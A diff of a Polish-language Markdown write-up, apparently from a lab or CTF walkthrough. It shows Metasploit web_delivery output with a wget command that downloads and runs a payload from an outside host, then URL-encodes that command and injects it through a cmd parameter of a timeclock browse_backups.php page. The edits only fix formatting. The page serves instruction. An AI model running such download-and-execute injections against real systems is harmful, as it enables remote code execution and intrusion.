@@ -122,20 +122,22 @@ msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/L49
 [*] Run the following command on the target machine:
 wget -qO o6OY7FJX --no-check-certificate http://172.16.1.10:8080/L495CA; chmod +x o6OY7FJX; ./o6OY7FJX& disown
 ```
-</div>
 Dostajemy link, który trzeba przekonwertować na kod URL. można to zrobić [tutaj](https://www.urldecoder.org/)
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 Tekst surowy:
+
 wget -qO o6OY7FJX --no-check-certificate http://172.16.1.10:8080/L495CA; chmod +x o6OY7FJX; ./o6OY7FJX& disown
 {: .notice--info}
 </div>
 <div class="notice--primary" markdown="1">
 Tekst zakodowany do formatu URL:
+
 wget%20-qO%20o6OY7FJX%20--no-check-certificate%20http%3A%2F%2F172.16.1.10%3A8080%2FL495CA%3B%20chmod%20%2Bx%20o6OY7FJX%3B%20.%2Fo6OY7FJX%26%20disown
 {: .notice--info}
+</div>
 <div class="notice--primary" markdown="1">
-Całość czyli Link+komenda wklejamy do przeglądarki:
+Całość, czyli link+komenda wklejamy do przeglądarki:
 http://172.16.1.167:8115//timeclock/backup/browse_backups.php?cmd=wget%20-qO%20o6OY7FJX%20--no-check-certificate%20http%3A%2F%2F172.16.1.10%3A8080%2FL495CA%3B%20chmod%20%2Bx%20o6OY7FJX%3B%20.%2Fo6OY7FJX%26%20disown
 {: .notice--info}
 </div>
